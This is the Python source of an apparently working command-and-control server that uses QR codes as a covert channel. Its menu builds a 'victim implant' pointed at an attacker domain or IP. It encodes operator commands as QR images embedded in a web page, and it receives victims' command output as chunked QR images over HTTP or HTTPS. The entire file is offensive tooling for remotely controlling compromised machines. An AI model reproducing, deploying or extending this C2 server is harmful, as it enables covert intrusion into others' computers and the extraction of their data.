import os
import time
import requests
from http.server import SimpleHTTPRequestHandler, HTTPServer
from io import BytesIO
from PIL import Image
from pyzbar.pyzbar import decode
import threading
import qrcode
import logging
import base64
import re
import ssl
import json

# GLOBAL VARS
PORT = 8080
USE_HTTPS = False
USE_APACHE_PROXY = False  # Set to True if Apache is handling HTTPS termination
SSL_CERT_FILE = "cert.pem"
SSL_KEY_FILE = "key.pem"
DOMAIN = "localhost"  # Change to your domain
POLL_INTERVAL = 3
C2_SERVER_DIR = "server_files"
ATTACKER_IP = None
PROCESSED_DIR = os.path.join(C2_SERVER_DIR, "processed")
CONFIG_FILE = "config.json"

if not os.path.exists(PROCESSED_DIR):
    os.makedirs(PROCESSED_DIR)
if not os.path.exists(C2_SERVER_DIR):
    os.makedirs(C2_SERVER_DIR)

TEMPLATE_PATH = "qr_template.py"
logging.basicConfig(level=logging.CRITICAL)

# Load configuration
def load_config():
    """Load configuration from config.json if it exists"""
    global PORT, USE_HTTPS, USE_APACHE_PROXY, DOMAIN, SSL_CERT_FILE, SSL_KEY_FILE
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
                PORT = config.get('port', PORT)
                USE_HTTPS = config.get('use_https', USE_HTTPS)
                USE_APACHE_PROXY = config.get('use_apache_proxy', USE_APACHE_PROXY)
                DOMAIN = config.get('domain', DOMAIN)
                SSL_CERT_FILE = config.get('ssl_cert_file', SSL_CERT_FILE)
                SSL_KEY_FILE = config.get('ssl_key_file', SSL_KEY_FILE)
        except Exception as e:
            print(f"[-] Error loading config: {e}")

load_config()



def build_implant(attacker_ip=None):
    print("[+] Building demo template...")
    if attacker_ip is None:
        attacker_ip = DOMAIN
    
    with open(TEMPLATE_PATH, "r") as template_file:
        implant_code = template_file.read()

    # Determine protocol and port for client connection
    if USE_APACHE_PROXY:
        # Apache handles HTTPS on 443, client connects to Apache
        protocol = "https"
        client_port = 443  # Default HTTPS port
        port_str = ""  # No port needed for default HTTPS
    else:
        # Direct connection to Python server
        protocol = "https" if USE_HTTPS else "http"
        client_port = PORT
        # Only add port if it's not the default (80 for HTTP, 443 for HTTPS)
        if (USE_HTTPS and PORT != 443) or (not USE_HTTPS and PORT != 80):
            port_str = f":{PORT}"
        else:
            port_str = ""
    
    implant_code = implant_code.replace("{attacker_ip}", attacker_ip)
    implant_code = implant_code.replace("{port}", str(client_port))
    implant_code = implant_code.replace("{protocol}", protocol)
    implant_code = implant_code.replace("{port_str}", port_str)

    with open("demo.py", "w") as f:
        f.write(implant_code)

    print(f"[+] Victim implant created as 'demo.py'")
    print(f"[+] Target: {protocol}://{attacker_ip}{port_str}")
    if USE_APACHE_PROXY:
        print(f"[!] Note: Apache proxy mode - client connects to port 443 (Apache)")
        print(f"[!]       Python server runs on port {PORT} (handled by Apache)")

def create_qr_code(command, index):
    print(f"[+] Sending command: {command}")
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(command)
    qr.make(fit=True)
    img = qr.make_image(fill='black', back_color='white')
    
    # Convert to base64 for embedding in HTML
    buffer = BytesIO()
    img.save(buffer, format='PNG')
    qr_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
    
    # Update web.html with the new QR code
    update_web_html(qr_base64)
    
    # Also save as PNG for backward compatibility
    filename = os.path.join(C2_SERVER_DIR, f"command{index}.png")
    img.save(filename)
    print(f"[+] Command QR Code embedded in web.html and saved as '{filename}'")
    return filename

def update_web_html(qr_base64_data):
    """Update web.html with the new QR code embedded as base64"""
    try:
        with open("web.html", "r", encoding="utf-8") as f:
            html_content = f.read()
        
        # First try to replace existing base64 data URL
        pattern = r'src="data:image/png;base64,[^"]*"'
        replacement = f'src="data:image/png;base64,{qr_base64_data}"'
        updated_html = re.sub(pattern, replacement, html_content)
        
        # If pattern not found, try to find the placeholder
        if updated_html == html_content:
            # Replace placeholder in the src attribute
            updated_html = html_content.replace('src="data:image/png;base64,{QR_CODE_DATA}"', 
                                                f'src="data:image/png;base64,{qr_base64_data}"')
            # Also try just the placeholder if the above doesn't match
            if updated_html == html_content:
                updated_html = html_content.replace("{QR_CODE_DATA}", qr_base64_data)
        
        with open("web.html", "w", encoding="utf-8") as f:
            f.write(updated_html)
        
        print(f"[+] Updated web.html with new QR code")
    except Exception as e:
        print(f"[-] Error updating web.html: {e}")

def decode_chunked_results():
    assembled_results = {}
    
    while True:
        for result_file in os.listdir(C2_SERVER_DIR):
            if result_file.startswith("result") and result_file.endswith(".png"):
                chunk_id = result_file.split("_")[-1].split(".")[0]
                result_id = "_".join(result_file.split("_")[:-1])
                
                if result_id not in assembled_results:
                    assembled_results[result_id] = {}

                try:
                    img_path = os.path.join(C2_SERVER_DIR, result_file)
                    img = Image.open(img_path)
                    decoded_objects = decode(img)
                    if decoded_objects:
                        chunk_content = decoded_objects[0].data.decode("utf-8")
                        assembled_results[result_id][chunk_id] = chunk_content
                        if not os.path.exists(PROCESSED_DIR):
                            os.makedirs(PROCESSED_DIR)
                        os.rename(img_path, os.path.join(PROCESSED_DIR, result_file))
                except Exception as e:
                    print(f"[-] Error decoding chunk {result_file}: {e}")

        # Assemble complete results
        for result_id, chunks in list(assembled_results.items()):
            if sorted(chunks.keys()) == [str(i) for i in range(len(chunks))]:
                complete_output = "".join(chunks[str(i)] for i in range(len(chunks)))
                print(f"[+] Complete result from {result_id}:\n{complete_output}")
                del assembled_results[result_id]


class C2ServerHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        return
    
    def _set_security_headers(self):
        """Set security headers for production"""
        self.send_header('X-Content-Type-Options', 'nosniff')
        self.send_header('X-Frame-Options', 'SAMEORIGIN')
        self.send_header('X-XSS-Protection', '1; mode=block')
        if USE_HTTPS:
            self.send_header('Strict-Transport-Security', 'max-age=31536000; includeSubDomains')

    def do_GET(self):
        # Handle result data sent via GET query parameter (fallback method)
        if self.path.startswith('/result') and '?data=' in self.path:
            try:
                from urllib.parse import urlparse, parse_qs
                parsed = urlparse(self.path)
                query_params = parse_qs(parsed.query)
                if 'data' in query_params:
                    b64_data = query_params['data'][0]
                    result_data = base64.b64decode(b64_data)
                    result_file = os.path.join(C2_SERVER_DIR, parsed.path.lstrip('/'))
                    with open(result_file, 'wb') as f:
                        f.write(result_data)
                    print(f"[+] Received result file (GET fallback): {result_file}")
                    self.send_response(200)
                    self.end_headers()
                    return
            except Exception as e:
                print(f"[-] Error parsing GET result: {e}")
                self.send_response(400)
                self.end_headers()
                return
        
        # Serve web.html with embedded QR code
        if self.path == '/' or self.path == '/web.html':
            if os.path.exists('web.html'):
                self.send_response(200)
                self.send_header('Content-Type', 'text/html; charset=utf-8')
                self._set_security_headers()
                self.end_headers()
                with open('web.html', 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()
        elif self.path.startswith('/command'):
            command_file = os.path.join(C2_SERVER_DIR, self.path.lstrip('/'))
            if os.path.exists(command_file):
                self.send_response(200)
                self.send_header('Content-Type', 'image/png')
                self._set_security_headers()
                self.end_headers()
                with open(command_file, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path.startswith('/result'):
            result_file = os.path.join(C2_SERVER_DIR, self.path.lstrip('/'))
            
            # Check if it's multipart/form-data
            content_type = self.headers.get('Content-Type', '')
            if 'multipart/form-data' in content_type:
                # Handle multipart form data
                try:
                    import cgi
                    form = cgi.FieldStorage(
                        fp=self.rfile,
                        headers=self.headers,
                        environ={'REQUEST_METHOD': 'POST'}
                    )
                    if 'file' in form:
                        file_item = form['file']
                        if file_item.file:
                            result_data = file_item.file.read()
                            with open(result_file, 'wb') as f:
                                f.write(result_data)
                            print(f"[+] Received result file (multipart): {result_file}")
                            self.send_response(200)
                            self.end_headers()
                            return
                except Exception as e:
                    print(f"[-] Error parsing multipart: {e}")
            
            # Handle regular POST with raw image data
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                if content_length > 0:
                    result_data = self.rfile.read(content_length)
                    with open(result_file, 'wb') as f:
                        f.write(result_data)
                    print(f"[+] Received result file: {result_file}")
                    self.send_response(200)
                    self.end_headers()
                else:
                    self.send_response(400)
                    self.end_headers()
            except Exception as e:
                print(f"[-] Error receiving result: {e}")
                self.send_response(500)
                self.end_headers()

def initialize_web_html():
    """Initialize web.html with a default 'waiting' QR code"""
    try:
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data("WAITING_FOR_COMMAND")
        qr.make(fit=True)
        img = qr.make_image(fill='black', back_color='white')
        
        buffer = BytesIO()
        img.save(buffer, format='PNG')
        qr_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
        
        update_web_html(qr_base64)
        print("[+] Initialized web.html with default QR code")
    except Exception as e:
        print(f"[-] Error initializing web.html: {e}")

def start_server():
    # Always bind to localhost - Apache will proxy to this
    server_address = ('127.0.0.1', PORT)
    httpd = HTTPServer(server_address, C2ServerHandler)
    
    # If using Apache proxy, run on HTTP (Apache handles HTTPS termination)
    if USE_APACHE_PROXY:
        protocol = "HTTP"
        print(f"[+] Starting C2 server on {protocol} port {PORT} at 127.0.0.1 (Apache proxy mode)...")
        print(f"[!] Apache handles HTTPS on port 443")
        print(f"[!] Clients connect to: https://{DOMAIN}")
        print(f"[!] Server only accessible from localhost (Apache proxies to it)")
    elif USE_HTTPS:
        if not os.path.exists(SSL_CERT_FILE) or not os.path.exists(SSL_KEY_FILE):
            print(f"[-] SSL certificate files not found!")
            print(f"[-] Expected: {SSL_CERT_FILE} and {SSL_KEY_FILE}")
            print(f"[-] You can generate self-signed certs with:")
            print(f"    openssl req -x509 -newkey rsa:4096 -nodes -out {SSL_CERT_FILE} -keyout {SSL_KEY_FILE} -days 365")
            print(f"[-] Or use Let's Encrypt for production")
            return
        
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(SSL_CERT_FILE, SSL_KEY_FILE)
        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
        protocol = "HTTPS"
        print(f"[+] Starting C2 server on {protocol} port {PORT} at 127.0.0.1...")
        print(f"[+] SSL Certificate: {SSL_CERT_FILE}")
        print(f"[+] SSL Key: {SSL_KEY_FILE}")
    else:
        protocol = "HTTP"
        print(f"[+] Starting C2 server on {protocol} port {PORT} at 127.0.0.1...")
    
    print(f"[+] Domain: {DOMAIN}")
    httpd.serve_forever()

def main():
    command_index = 0
    
    # Initialize web.html with default QR code
    initialize_web_html()
    
    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()

    result_decoder_thread = threading.Thread(target=decode_chunked_results)
    result_decoder_thread.daemon = True
    result_decoder_thread.start()
    time.sleep(2)
    while True:
        print("\n[1] Start C2 server")
        print("[2] Build victim implant")
        print("[3] Show configuration")
        print("[4] Configure server")
        choice = input("[>] Choose an option: ")

        if choice == "1":
            print("[+] You can start sending commands, once the victim will send the first GET request, the results will be appear here...")
            while True:
                command = input("[>] Enter command for victim: ").strip()
                if command:
                    create_qr_code(command, command_index)
                    command_index += 1
                else:
                    print("[-] Invalid command.")
        elif choice == "2":
            attacker_ip = input(f"[>] Enter attacker domain/IP (default: {DOMAIN}): ").strip()
            if not attacker_ip:
                attacker_ip = DOMAIN
            build_implant(attacker_ip)
        elif choice == "3":
            print("\n[+] Current Configuration:")
            print(f"    Port: {PORT}")
            print(f"    HTTPS: {USE_HTTPS}")
            print(f"    Apache Proxy: {USE_APACHE_PROXY}")
            print(f"    Domain: {DOMAIN}")
            print(f"    SSL Cert: {SSL_CERT_FILE}")
            print(f"    SSL Key: {SSL_KEY_FILE}")
            if USE_APACHE_PROXY:
                print(f"\n[!] Apache Proxy Mode:")
                print(f"    - Client connects to: https://{DOMAIN} (port 443)")
                print(f"    - Python server runs on: port {PORT}")
            print("\n[+] To change configuration, edit config.json")
        elif choice == "4":
            print("\n[+] Configuration Options:")
            print("    [1] Enable HTTPS")
            print("    [2] Disable HTTPS")
            print("    [3] Enable Apache Proxy Mode")
            print("    [4] Disable Apache Proxy Mode")
            print("    [5] Change Domain")
            print("    [6] Change Port")
            config_choice = input("[>] Choose option: ").strip()
            
            config = {}
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
            
            if config_choice == "1":
                config['use_https'] = True
                print("[+] HTTPS enabled. Make sure SSL certificates are configured.")
            elif config_choice == "2":
                config['use_https'] = False
                print("[+] HTTPS disabled.")
            elif config_choice == "3":
                config['use_apache_proxy'] = True
                print("[+] Apache Proxy Mode enabled.")
                print("[!] Client will connect to port 443 (Apache)")
                print("[!] Python server should run on HTTP port 8080")
            elif config_choice == "4":
                config['use_apache_proxy'] = False
                print("[+] Apache Proxy Mode disabled.")
            elif config_choice == "5":
                new_domain = input(f"[>] Enter new domain (current: {DOMAIN}): ").strip()
                if new_domain:
                    config['domain'] = new_domain
            elif config_choice == "6":
                new_port = input(f"[>] Enter new port (current: {PORT}): ").strip()
                if new_port.isdigit():
                    config['port'] = int(new_port)
            
            with open(CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            print("[+] Configuration saved. Restart server to apply changes.")
            load_config()
        else:
            print("[-] Invalid choice.")

if __name__ == "__main__":
    main()
